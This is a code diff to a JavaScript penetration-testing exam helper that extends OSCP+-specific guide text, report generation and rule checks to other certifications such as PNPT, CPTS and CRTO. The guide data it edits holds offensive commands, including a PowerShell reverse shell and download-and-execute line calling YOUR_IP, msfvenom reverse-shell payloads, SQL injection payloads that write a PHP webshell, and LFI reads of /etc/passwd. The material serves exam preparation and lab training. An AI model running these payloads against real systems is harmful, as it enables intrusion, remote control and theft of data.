@@ -1244,7 +1244,7 @@ const GUIDES = {
       {
         title: 'First: Are You Sure?',
         collapsed: false,
-        content: `<span class="tag critical">RESCAN FIRST</span><p>SSH-only is rare in OSCP+. You likely missed ports.</p>`,
+        content: `<span class="tag critical">RESCAN FIRST</span><p>SSH-only is rare in exams. You likely missed ports.</p>`,
         commands: [
           { label: 'Full TCP scan', cmd: 'nmap -p- -T4 --min-rate 1000 TARGET' },
           { label: 'UDP top 200', cmd: 'sudo nmap -sU --top-ports 200 TARGET' },
@@ -1323,7 +1323,7 @@ const GUIDES = {
   },
   'web-only': {
     title: 'Web-Only Boxes',
-    intro: 'Most OSCP+ boxes are web-heavy. Systematic enumeration is key.',
+    intro: 'Most exam boxes are web-heavy. Systematic enumeration is key.',
     sections: [
       {
         title: 'CMS Identification',
@@ -1750,7 +1750,7 @@ const GUIDES = {
   },
   'missed': {
     title: 'Things People Commonly Miss',
-    intro: 'Before giving up, go through this list. OSCP+ boxes always have a path.',
+    intro: 'Before giving up, go through this list. Exam boxes always have a path.',
     sections: [
       {
         title: 'Scanning & Enumeration',
@@ -2485,13 +2485,13 @@ const GUIDES = {
   },
   'ad-acl': {
     title: 'ACL Abuse',
-    intro: 'Misconfigured ACLs are very common in OSCP+. BloodHound will show these paths.',
+    intro: 'Misconfigured ACLs are very common in exams. BloodHound will show these paths.',
     sections: [
       {
         title: 'ACL Abuse (GenericAll / WriteDacl / WriteOwner)',
         collapsed: false,
         content: `<span class="tag critical">CHECK BLOODHOUND</span>
-<p>Misconfigured ACLs are very common in OSCP+. BloodHound will show these paths. Here are the main ones:</p>`,
+<p>Misconfigured ACLs are very common in exams. BloodHound will show these paths. Here are the main ones:</p>`,
         commands: [
           { label: 'GenericAll on user → reset password', cmd: "net user TARGET_USER NewPassword123! /domain" },
           { label: 'GenericAll on user → targeted kerberoast', cmd: "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fakeservice/fake'}\";\nimpacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET -request" },
@@ -2596,7 +2596,7 @@ const GUIDES = {
       {
         title: 'Certificate Abuse (AD CS / ESC1-ESC8)',
         collapsed: false,
-        content: `<span class="tag critical">HIGH VALUE IN OSCP+</span>
+        content: `<span class="tag critical">HIGH VALUE IN EXAMS</span>
 <p>Active Directory Certificate Services (AD CS) misconfigurations allow privilege escalation to Domain Admin.</p>`,
         commands: [
           { label: 'Find vulnerable templates (Certipy)', cmd: 'certipy find -u USER@DOMAIN -p PASS -dc-ip TARGET -vulnerable' },
@@ -2842,12 +2842,12 @@ const GUIDES = {
   },
   'cmd-pivoting': {
     title: 'Pivoting / Tunneling / Chisel',
-    intro: 'Access internal networks through compromised hosts. Chisel is the go-to tool for OSCP+.',
+    intro: 'Access internal networks through compromised hosts. Chisel is the go-to tool for exam pivoting.',
     sections: [
       {
         title: 'Chisel - Reverse SOCKS Proxy',
         collapsed: false,
-        content: `<span class="tag critical">MOST COMMON IN OSCP+</span>
+        content: `<span class="tag critical">MOST COMMON IN EXAMS</span>
 <p>Route all traffic through a compromised host to reach internal networks. Reverse mode = target connects back to you.</p>
 <h4>Step-by-Step:</h4>
 <div class="step"><div class="step-num">1</div><div class="step-content">Transfer chisel binary to target</div></div>
@@ -2916,7 +2916,7 @@ const GUIDES = {
       {
         title: 'Double Pivoting',
         collapsed: true,
-        content: `<span class="tag important">OSCP+ may require this</span>
+        content: `<span class="tag important">EXAMS MAY REQUIRE THIS</span>
 <p>Reach a third network through two compromised hosts.</p>`,
         commands: [
           { label: 'Chisel double pivot', cmd: '# 1. First pivot: Attacker → Target1\nchisel server --reverse -p 8081  # attacker\n./chisel client YOUR_IP:8081 R:socks  # target1\n\n# 2. Transfer chisel to Target2 via proxychains\nproxychains scp chisel user@TARGET2:/tmp/\n\n# 3. Second pivot: Target1 → Target2\n./chisel server --reverse -p 9001  # on target1\n./chisel client TARGET1_IP:9001 R:1081:socks  # on target2\n\n# 4. Add second proxy to proxychains.conf\n# socks5 127.0.0.1 1081' },
@@ -2951,8 +2951,12 @@ const GUIDES = {
         commands: [
           { label: 'PowerShell (base64)', cmd: "powershell -e BASE64_ENCODED_PAYLOAD\n# Generate: echo -n \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\" | iconv -t UTF-16LE | base64 -w0" },
           { label: 'PowerShell one-liner', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"" },
-          { label: 'msfvenom Windows shell [MSF - 1 MACHINE ONLY!]', cmd: '# WARNING: Metasploit/msfvenom only allowed on ONE machine!\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe' },
-          { label: 'msfvenom Linux shell [MSF - 1 MACHINE ONLY!]', cmd: '# WARNING: Metasploit/msfvenom only allowed on ONE machine!\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf' }
+          { label: 'msfvenom Windows shell', cmd: () => examRules().msfRestricted
+              ? '# WARNING: Metasploit/msfvenom only allowed on ONE machine!\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe'
+              : 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe' },
+          { label: 'msfvenom Linux shell', cmd: () => examRules().msfRestricted
+              ? '# WARNING: Metasploit/msfvenom only allowed on ONE machine!\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf'
+              : 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf' }
         ]
       },
       {
@@ -3114,7 +3118,9 @@ const GUIDES = {
   },
   'proof-collection': {
     title: 'Proof Collection',
-    intro: 'OSCP+ requires specific screenshots. Miss one = lose points. Run these commands IMMEDIATELY after getting user/root.',
+    intro: () => currentMode === 'oscpPlus'
+      ? 'OSCP+ requires specific screenshots. Miss one = lose points. Run these commands IMMEDIATELY after getting user/root.'
+      : 'Always capture proof of exploitation immediately. Run these commands right after getting user/root access.',
     sections: [
       {
         title: 'Linux Proof',
@@ -3235,12 +3241,21 @@ const GUIDES = {
   },
   'exam-strategy': {
     title: 'Exam Strategy & Timer',
-    intro: 'The OSCP+ exam is 23:45 hours. Most people fail because of TIME MANAGEMENT, not lack of skills. Follow this strategy.',
+    intro: () => {
+      const mode = MODES[currentMode];
+      if (currentMode === 'oscpPlus') return 'The OSCP+ exam is 23:45 hours. Most people fail because of TIME MANAGEMENT, not lack of skills. Follow this strategy.';
+      if (currentMode === 'pnpt') return 'The PNPT exam gives you 5 days for pentesting + 2 days for the report. All tools are allowed — sqlmap, Metasploit, anything. Focus on methodology and thorough reporting.';
+      if (currentMode === 'cpts') return 'The HTB CPTS exam is 10 days. All tools are allowed. Focus on thorough enumeration and complete documentation.';
+      if (currentMode === 'crto') return 'The CRTO exam is 48 hours. Focus on C2 operations, lateral movement, and objective completion.';
+      if (mode?.timer) return `You have ${Math.floor(mode.duration / 60)}h ${mode.duration % 60}min. Good time management is the key to passing. Follow this strategy.`;
+      return 'Plan your approach and manage your time. Systematic enumeration beats random exploitation.';
+    },
     sections: [
       {
         title: 'Exam Structure',
         collapsed: false,
-        content: `<span class="tag critical">KNOW THIS</span>
+        content: () => {
+          if (currentMode === 'oscpPlus') return `<span class="tag critical">KNOW THIS</span>
 <ul>
 <li><strong>3 standalone machines</strong> = 60 points (20 each: 10 user + 10 root)</li>
 <li><strong>1 AD set</strong> (3 machines) = 40 points (all-or-nothing)</li>
@@ -3249,7 +3264,33 @@ const GUIDES = {
 <li>Bonus: 10 points from lab report (if eligible)</li>
 </ul>
 <p><strong>With bonus points (10):</strong> You need 60 more points = AD set (40) + 1 standalone full (20) = pass!</p>
-<p><strong>Without bonus:</strong> You need 70 = AD set (40) + 1.5 standalones (30) = pass</p>`,
+<p><strong>Without bonus:</strong> You need 70 = AD set (40) + 1.5 standalones (30) = pass</p>`;
+          if (currentMode === 'pnpt') return `<span class="tag critical">KNOW THIS</span>
+<ul>
+<li><strong>5 days</strong> for the penetration test</li>
+<li><strong>2 days</strong> for the report after exam ends</li>
+<li><strong>All tools allowed</strong> — sqlmap, Metasploit, Burp Pro, anything</li>
+<li>Scope includes <strong>external + internal network</strong></li>
+<li>Must demonstrate <strong>full attack chain</strong> from external to Domain Admin</li>
+<li>Report quality matters — professional-grade deliverable expected</li>
+</ul>`;
+          if (currentMode === 'cpts') return `<span class="tag critical">KNOW THIS</span>
+<ul>
+<li><strong>10 days</strong> for the penetration test + report</li>
+<li><strong>All tools allowed</strong> — no restrictions</li>
+<li>Multiple attack paths across several machines</li>
+<li>Thorough enumeration and documentation required</li>
+<li>Must collect all flags to pass</li>
+</ul>`;
+          if (currentMode === 'crto') return `<span class="tag critical">KNOW THIS</span>
+<ul>
+<li><strong>48 hours</strong> to complete objectives</li>
+<li>Focus on <strong>C2 operations</strong> with Cobalt Strike / Nighthawk</li>
+<li>Lateral movement and credential harvesting</li>
+<li>Must complete <strong>6 out of 8 flags</strong> to pass</li>
+</ul>`;
+          return `<p>Review the exam rules and structure for your specific certification before starting.</p>`;
+        },
         commands: []
       },
       {
@@ -3278,7 +3319,7 @@ const GUIDES = {
 <li><strong>Take screenshots AS YOU GO.</strong> Don't wait until the end.</li>
 <li><strong>Document every step.</strong> Write notes in the Report Editor as you go. You WILL forget steps.</li>
 <li><strong>Submit flags IMMEDIATELY</strong> in the exam control panel. Don't save them for later.</li>
-<li><strong>No rabbit holes:</strong> If something feels too complex for OSCP+, it probably is. Look elsewhere.</li>
+<li><strong>No rabbit holes:</strong> If something feels too complex for the exam, it probably is. Look elsewhere.</li>
 <li><strong>Credential reuse:</strong> Found a password? Try it on EVERY machine/service.</li>
 <li><strong>Check ALL ports:</strong> Run a full port scan. Hidden services on high ports are common.</li>
 <li><strong>Read error messages:</strong> They often contain version info or path disclosure.</li>
@@ -3379,7 +3420,9 @@ const GUIDES = {
   },
   'ad-chain': {
     title: 'AD Attack Chain',
-    intro: 'The OSCP+ AD set is all-or-nothing (40 points). Follow this chain systematically. Do NOT skip steps.',
+    intro: () => currentMode === 'oscpPlus'
+      ? 'The OSCP+ AD set is all-or-nothing (40 points). Follow this chain systematically. Do NOT skip steps.'
+      : 'Active Directory attacks follow a systematic chain. Enumerate thoroughly and follow each step.',
     sections: [
       {
         title: 'Phase 1: Reconnaissance',
@@ -3525,7 +3568,7 @@ const GUIDES = {
       {
         title: 'File Password Cracking',
         collapsed: false,
-        content: `<span class="tag critical">COMMON IN OSCP+</span><p>Found a password-protected file? Extract hash → crack it.</p>`,
+        content: `<span class="tag critical">COMMON IN EXAMS</span><p>Found a password-protected file? Extract hash → crack it.</p>`,
         commands: [
           { label: 'ZIP file', cmd: 'zip2john protected.zip > zip_hash.txt\njohn zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Or hashcat:\nzip2john protected.zip | cut -d: -f2 > zip_hashcat.txt\nhashcat -m 17200 zip_hashcat.txt /usr/share/wordlists/rockyou.txt  # PKZIP\nhashcat -m 13600 zip_hashcat.txt /usr/share/wordlists/rockyou.txt  # WinZip' },
           { label: 'RAR / WinRAR file', cmd: 'rar2john protected.rar > rar_hash.txt\njohn rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Or hashcat:\nhashcat -m 13000 rar_hash.txt /usr/share/wordlists/rockyou.txt  # RAR3\nhashcat -m 23700 rar_hash.txt /usr/share/wordlists/rockyou.txt  # RAR5' },
@@ -3581,12 +3624,12 @@ const GUIDES = {
   },
   'cmd-webattacks': {
     title: 'Web Attacks Deep-Dive',
-    intro: 'Detailed attack techniques for common web vulnerabilities found in OSCP+.',
+    intro: 'Detailed attack techniques for common web vulnerabilities found in penetration testing exams.',
     sections: [
       {
         title: 'LFI / Local File Inclusion',
         collapsed: false,
-        content: `<span class="tag critical">COMMON IN OSCP+</span><p>Look for parameters like: <code>?page=</code>, <code>?file=</code>, <code>?view=</code>, <code>?lang=</code>, <code>?include=</code></p>`,
+        content: `<span class="tag critical">COMMON IN EXAMS</span><p>Look for parameters like: <code>?page=</code>, <code>?file=</code>, <code>?view=</code>, <code>?lang=</code>, <code>?include=</code></p>`,
         commands: [
           { label: 'Basic LFI', cmd: 'curl http://TARGET/index.php?page=../../../../../etc/passwd' },
           { label: 'Null byte (PHP < 5.3)', cmd: 'curl http://TARGET/index.php?page=../../../../../etc/passwd%00' },
@@ -3640,21 +3683,35 @@ const GUIDES = {
       {
         title: 'SQL Injection (Manual)',
         collapsed: false,
-        content: `<span class="tag tip">SQLMAP IS BANNED</span><p>You must do SQL injection manually in OSCP+. Test every input field and URL parameter.</p>`,
-        commands: [
-          { label: 'Detect SQLi', cmd: "# Add these to parameters:\n' \n'' \n; \n-- \n' OR '1'='1\n' OR '1'='1'-- -\n\" OR \"1\"=\"1\"-- -\n1 OR 1=1-- -" },
-          { label: 'UNION-based enum columns', cmd: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n# Increase until error → number of columns" },
-          { label: 'UNION SELECT', cmd: "' UNION SELECT 1,2,3-- -\n# Check which numbers appear in output" },
-          { label: 'Get database version', cmd: "' UNION SELECT 1,version(),3-- -\n# Or: ' UNION SELECT 1,@@version,3-- -" },
-          { label: 'Get databases', cmd: "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -" },
-          { label: 'Get tables', cmd: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='DBNAME'-- -" },
-          { label: 'Get columns', cmd: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='TABLENAME'-- -" },
-          { label: 'Dump data', cmd: "' UNION SELECT 1,CONCAT(username,':',password),3 FROM TABLENAME-- -" },
-          { label: 'Read files (MySQL)', cmd: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -" },
-          { label: 'Write webshell (MySQL)', cmd: "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -" },
-          { label: 'Error-based (MySQL)', cmd: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -" },
-          { label: 'Time-based blind', cmd: "' AND SLEEP(5)-- -\n# If page delays 5s, SQLi confirmed" }
-        ]
+        content: () => examRules().sqlmapAllowed
+          ? `<span class="tag tip">SQLMAP ALLOWED</span><p>Automated tools like sqlmap are permitted in this exam. Manual techniques are still valuable for understanding.</p>`
+          : `<span class="tag tip">SQLMAP IS BANNED</span><p>You must do SQL injection manually in OSCP+. Test every input field and URL parameter.</p>`,
+        commands: () => {
+          const manual = [
+            { label: 'Detect SQLi', cmd: "# Add these to parameters:\n' \n'' \n; \n-- \n' OR '1'='1\n' OR '1'='1'-- -\n\" OR \"1\"=\"1\"-- -\n1 OR 1=1-- -" },
+            { label: 'UNION-based enum columns', cmd: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n# Increase until error → number of columns" },
+            { label: 'UNION SELECT', cmd: "' UNION SELECT 1,2,3-- -\n# Check which numbers appear in output" },
+            { label: 'Get database version', cmd: "' UNION SELECT 1,version(),3-- -\n# Or: ' UNION SELECT 1,@@version,3-- -" },
+            { label: 'Get databases', cmd: "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -" },
+            { label: 'Get tables', cmd: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='DBNAME'-- -" },
+            { label: 'Get columns', cmd: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='TABLENAME'-- -" },
+            { label: 'Dump data', cmd: "' UNION SELECT 1,CONCAT(username,':',password),3 FROM TABLENAME-- -" },
+            { label: 'Read files (MySQL)', cmd: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -" },
+            { label: 'Write webshell (MySQL)', cmd: "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -" },
+            { label: 'Error-based (MySQL)', cmd: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -" },
+            { label: 'Time-based blind', cmd: "' AND SLEEP(5)-- -\n# If page delays 5s, SQLi confirmed" }
+          ];
+          if (examRules().sqlmapAllowed) {
+            manual.push(
+              { label: 'sqlmap — GET parameter', cmd: "sqlmap -u 'http://TARGET/page?id=1' --batch --dbs" },
+              { label: 'sqlmap — POST data', cmd: "sqlmap -u 'http://TARGET/login' --data 'user=admin&pass=test' --batch --dbs" },
+              { label: 'sqlmap — with cookie', cmd: "sqlmap -u 'http://TARGET/page?id=1' --cookie 'PHPSESSID=abc123' --batch --dbs" },
+              { label: 'sqlmap — dump table', cmd: "sqlmap -u 'http://TARGET/page?id=1' -D DBNAME -T TABLENAME --dump --batch" },
+              { label: 'sqlmap — OS shell', cmd: "sqlmap -u 'http://TARGET/page?id=1' --os-shell --batch" }
+            );
+          }
+          return manual;
+        }
       },
       {
         title: 'SSTI (Server-Side Template Injection)',
@@ -4769,7 +4826,7 @@ function renderReportOverview(container) {
     <div class="flag-card" style="margin-bottom:16px">
       <h3 style="color:var(--accent);margin-top:0">Student Info</h3>
       <div class="flag-row"><label>Lab</label>
-        <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.labName || '')}" placeholder="e.g. OSCP+ Lab 2026-03" oninput="targetData.labName=this.value.trim();saveTargetData();">
+        <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.labName || '')}" placeholder="e.g. Exam Lab 2026-03" oninput="targetData.labName=this.value.trim();saveTargetData();">
       </div>
       <div class="flag-row"><label>Name</label>
         <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.studentName || '')}" placeholder="Full name" oninput="targetData.studentName=this.value.trim();saveTargetData();">
@@ -4917,23 +4974,25 @@ function backTree() {
 function renderGuide(container, guide) {
   container.innerHTML = `
     <h2>${guide.title}</h2>
-    <p>${guide.intro}</p>
+    <p>${typeof guide.intro === 'function' ? guide.intro() : guide.intro}</p>
     ${guide.sections.map(section => `
       <div class="card collapsible${section.collapsed ? ' collapsed' : ''}">
         <div class="card-header" onclick="this.parentElement.classList.toggle('collapsed')">
           <h3>${section.title}</h3>
         </div>
         <div class="card-body">
-          ${section.content || ''}
-          ${(section.commands || []).map(cmd => `
-            <div class="cmd-block" data-original-cmd="${escapeHtml(cmd.cmd).replace(/"/g, '&quot;')}">
+          ${typeof section.content === 'function' ? section.content() : (section.content || '')}
+          ${(typeof section.commands === 'function' ? section.commands() : (section.commands || [])).map(cmd => {
+            const cmdText = typeof cmd.cmd === 'function' ? cmd.cmd() : cmd.cmd;
+            return `
+            <div class="cmd-block" data-original-cmd="${escapeHtml(cmdText).replace(/"/g, '&quot;')}">
               <div class="cmd-header">
                 <span class="cmd-label">${cmd.label}</span>
                 <button class="cmd-copy" onclick="copyCmd(this)">Copy</button>
               </div>
-              <pre>${replaceVarsHtml(cmd.cmd)}</pre>
+              <pre>${replaceVarsHtml(cmdText)}</pre>
             </div>
-          `).join('')}
+          `}).join('')}
         </div>
       </div>
     `).join('')}
@@ -4944,7 +5003,7 @@ function renderGuide(container, guide) {
 function renderChecklist(container, checklist) {
   container.innerHTML = `
     <h2>${checklist.title}</h2>
-    <p>${checklist.intro}</p>
+    <p>${typeof checklist.intro === 'function' ? checklist.intro() : checklist.intro}</p>
     <div style="margin-bottom:16px">
       <button class="dt-btn" onclick="clearChecklist()">Clear All</button>
     </div>
@@ -5519,10 +5578,12 @@ function toggleMsf() {
     return;
   }
 
-  const other = getMsfMachine();
-  if (other && other.uid !== machine.uid) {
-    if (!confirm(`WARNING: Metasploit is already marked as used on "${other.hostname}" (${other.ip})!\n\nUsing MSF on more than 1 machine = EXAM FAILURE.\n\nAre you sure you want to move the MSF flag to this machine?`)) return;
-    other.report.msfUsed = false;
+  if (examRules().msfRestricted) {
+    const other = getMsfMachine();
+    if (other && other.uid !== machine.uid) {
+      if (!confirm(`WARNING: Metasploit is already marked as used on "${other.hostname}" (${other.ip})!\n\nUsing MSF on more than 1 machine = EXAM FAILURE.\n\nAre you sure you want to move the MSF flag to this machine?`)) return;
+      other.report.msfUsed = false;
+    }
   }
   machine.report.msfUsed = true;
   saveTargetData();
@@ -5871,9 +5932,9 @@ function renderReportEditor(container) {
       <button class="ss-upload-btn" style="padding:8px 16px;font-size:13px" onclick="generatePDFReportAll()">📄 Export PDF — All Machines</button>
     </div>
 
-    <div class="msf-tracker ${machine.report.msfUsed ? 'active' : ''}">
+    ${examRules().msfRestricted ? `<div class="msf-tracker ${machine.report.msfUsed ? 'active' : ''}">
       <div class="msf-label">
-        <strong>Metasploit</strong> used on this machine?
+        <strong>Metasploit</strong> used on this machine? <span style="font-size:11px;color:var(--yellow)">(restricted to 1 machine)</span>
         ${(() => {
           const other = getMsfMachine();
           if (other && other.uid !== machine.uid) {
@@ -5883,7 +5944,7 @@ function renderReportEditor(container) {
         })()}
       </div>
       <button class="msf-toggle ${machine.report.msfUsed ? 'on' : ''}" onclick="toggleMsf()"></button>
-    </div>
+    </div>` : ''}
 
     <div class="flag-card" style="margin-bottom:12px">
       <h3 style="color:var(--accent);margin-top:0">Executive Summary</h3>
@@ -6472,11 +6533,11 @@ async function _buildPDF(machines) {
     doc.setFontSize(12);
     doc.setTextColor(255, 255, 255);
     doc.setFont('helvetica', 'normal');
-    doc.text('OFFENSIVE SECURITY', m, 35);
+    doc.text(MODES[currentMode]?.label?.toUpperCase() || 'PENETRATION TEST', m, 35);
 
     doc.setFontSize(32);
     doc.setFont('helvetica', 'bold');
-    doc.text('OSCP+', m, 55);
+    doc.text(MODES[currentMode]?.label || 'PwnBase', m, 55);
     doc.setFontSize(20);
     doc.text('Penetration Test Report', m, 67);
 
@@ -6574,7 +6635,7 @@ async function _buildPDF(machines) {
       .map(m => `${m.hostname} (${m.ip}):\n${m.report.executiveSummary.trim()}`);
     const summaryText = customSummaries.length > 0
       ? customSummaries.join('\n\n')
-      : `This report presents the findings of an OSCP+ penetration test conducted on ${today}. The assessment targeted ${machines.length} machine${machines.length > 1 ? 's' : ''} in the exam environment. Each machine was approached systematically through reconnaissance, initial access, and privilege escalation phases.`;
+      : `This report presents the findings of a ${MODES[currentMode]?.label || 'penetration test'} conducted on ${today}. The assessment targeted ${machines.length} machine${machines.length > 1 ? 's' : ''} in the exam environment. Each machine was approached systematically through reconnaissance, initial access, and privilege escalation phases.`;
     y = pdfWriteWrapped(doc, summaryText, m, y, cw, 5.5);
     y += 8;
 
@@ -6632,7 +6693,7 @@ async function _buildPDF(machines) {
     // ========== SAVE ==========
     const dateStr = new Date().toISOString().slice(0, 10);
     const name = machines.length === 1 ? machines[0].hostname : 'all';
-    doc.save(`OSCP+_Report_${name}_${dateStr}.pdf`);
+    doc.save(`${(MODES[currentMode]?.key || 'PwnBase').replace(/\s+/g, '_')}_Report_${name}_${dateStr}.pdf`);
 
   } catch (e) {
     console.error('PDF generation failed:', e);
@@ -7723,15 +7784,17 @@ document.addEventListener('keydown', (e) => {
 });
 
 // ===== MODES =====
+const EXAM_RULES_DEFAULTS = { sqlmapAllowed: true, msfRestricted: false, autoExploitBanned: false };
 const MODES = {
-  lab:       { key: 'lab',       label: 'Lab / Practice',  icon: '🧪', timer: false, duration: 0, desc: 'Free practice, no time limit' },
-  pentest:   { key: 'pentest',   label: 'Pentest',         icon: '🔐', timer: false, duration: 0, desc: 'Professional pentest engagement' },
-  oscpPlus:  { key: 'oscpPlus',  label: 'OSCP+ Exam',      icon: '🎯', timer: true,  duration: 23 * 60 + 45, desc: '23h 45min — 3 Standalones + AD Set' },
-  pnpt:      { key: 'pnpt',      label: 'PNPT Exam',       icon: '🛡️', timer: true,  duration: 5 * 24 * 60,  desc: '5 days pentest + 2 days report' },
-  cpts:      { key: 'cpts',      label: 'HTB CPTS',        icon: '📦', timer: true,  duration: 10 * 24 * 60, desc: '10 days — HackTheBox CPTS' },
-  crto:      { key: 'crto',      label: 'CRTO Exam',       icon: '🏴', timer: true,  duration: 48 * 60,      desc: '48h — Certified Red Team Operator' },
-  custom:    { key: 'custom',    label: 'Custom',           icon: '⚙️', timer: true,  duration: 24 * 60,      desc: 'Set your own time limit' }
+  lab:       { key: 'lab',       label: 'Lab / Practice',  icon: '🧪', timer: false, duration: 0, desc: 'Free practice, no time limit', rules: {} },
+  pentest:   { key: 'pentest',   label: 'Pentest',         icon: '🔐', timer: false, duration: 0, desc: 'Professional pentest engagement', rules: {} },
+  oscpPlus:  { key: 'oscpPlus',  label: 'OSCP+ Exam',      icon: '🎯', timer: true,  duration: 23 * 60 + 45, desc: '23h 45min — 3 Standalones + AD Set', rules: { sqlmapAllowed: false, msfRestricted: true, autoExploitBanned: true } },
+  pnpt:      { key: 'pnpt',      label: 'PNPT Exam',       icon: '🛡️', timer: true,  duration: 5 * 24 * 60,  desc: '5 days pentest + 2 days report', rules: {} },
+  cpts:      { key: 'cpts',      label: 'HTB CPTS',        icon: '📦', timer: true,  duration: 10 * 24 * 60, desc: '10 days — HackTheBox CPTS', rules: {} },
+  crto:      { key: 'crto',      label: 'CRTO Exam',       icon: '🏴', timer: true,  duration: 48 * 60,      desc: '48h — Certified Red Team Operator', rules: {} },
+  custom:    { key: 'custom',    label: 'Custom',           icon: '⚙️', timer: true,  duration: 24 * 60,      desc: 'Set your own time limit', rules: {} }
 };
+function examRules() { return Object.assign({}, EXAM_RULES_DEFAULTS, MODES[currentMode]?.rules || {}); }
 
 const TIMER_HINTS = {
   oscpPlus: [
